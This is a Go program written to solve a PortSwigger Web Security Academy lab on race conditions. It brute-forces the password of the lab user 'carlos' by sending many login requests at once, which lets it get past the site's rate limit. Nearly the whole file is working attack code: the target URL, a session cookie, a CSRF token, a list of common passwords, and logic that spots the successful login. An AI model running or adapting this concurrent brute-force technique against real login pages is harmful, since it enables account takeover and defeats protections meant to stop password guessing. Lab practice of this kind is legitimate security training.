// This Go script is designed to brute-force the password for the user carlos by exploiting a race condition to bypass rate limits.
// It rapidly sends multiple concurrent login requests with different common passwords. By leveraging Go's goroutines, it initiates
// multiple simultaneous login attempts, thereby potentially bypassing rate-limiting defenses due to the high concurrency. Each request
// sends a pre-set username (carlos) and password, checking for response indicators that reveal whether the password was correct.
// Upon finding the correct password, it prints a success message for the password, allowing access to the admin panel to proceed with
// further actions as directed in the lab instructions.

// https://portswigger.net/web-security/race-conditions/lab-race-conditions-bypassing-rate-limits

package main

import (
	"bytes"
	"fmt"
	"io/ioutil"
	"net/http"
	"net/url"
	"strings"
	"sync"
)

var (
	postURL = "https://0ad1002003c6c171832c55dc00e2000f.web-security-academy.net/login"
	cookies = "session=Wq8XrwthuQti4jpaPclsDNBhWG4tLLj0"
	headers = map[string]string{
		"Content-Type": "application/x-www-form-urlencoded",
		"Origin":       "https://0ad1002003c6c171832c55dc00e2000f.web-security-academy.net",
		"Referer":      "https://0ad1002003c6c171832c55dc00e2000f.web-security-academy.net/login",
		"User-Agent":   "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.6422.112 Safari/537.36",
	}
	passwords = []string{
		"123123", "abc123", "football", "monkey", "letmein", "shadow", "master", "666666",
		"qwertyuiop", "123321", "mustang", "123456", "password", "12345678", "qwerty",
		"123456789", "12345", "1234", "111111", "1234567", "dragon", "1234567890", "michael",
		"x654321", "superman", "1qaz2wsx", "baseball", "7777777", "121212", "000000",
	}
)

func sendPostRequest(password string, wg *sync.WaitGroup) {
	defer wg.Done()

	client := &http.Client{}
	data := url.Values{
		"csrf":     {"kBjFnySTSRBk2t2EviUUvAXXHN6wP7uQ"},
		"username": {"carlos"},
		"password": {password},
	}

	req, err := http.NewRequest("POST", postURL, bytes.NewBufferString(data.Encode()))
	if err != nil {
		fmt.Println("Error creating request:", err)
		return
	}

	for key, value := range headers {
		req.Header.Set(key, value)
	}
	req.Header.Set("Cookie", cookies)

	resp, err := client.Do(req)
	if err != nil {
		fmt.Println("Error sending request:", err)
		return
	}
	defer resp.Body.Close()

	body, _ := ioutil.ReadAll(resp.Body)
	// fmt.Printf("POST status: %d, response: %s\n", resp.StatusCode, string(body))
	if strings.Contains(string(body), "Invalid username or password.") {
		fmt.Println("Not working, remove from list > " + password)
	}

	if strings.Contains(string(body), "carlos") {
		fmt.Println("THIS IS THE ONE!!! > " + password)
	}
}

func main() {
	var wg sync.WaitGroup

	for _, password := range passwords {
		wg.Add(1)
		go sendPostRequest(password, &wg)
	}

	wg.Wait()
}
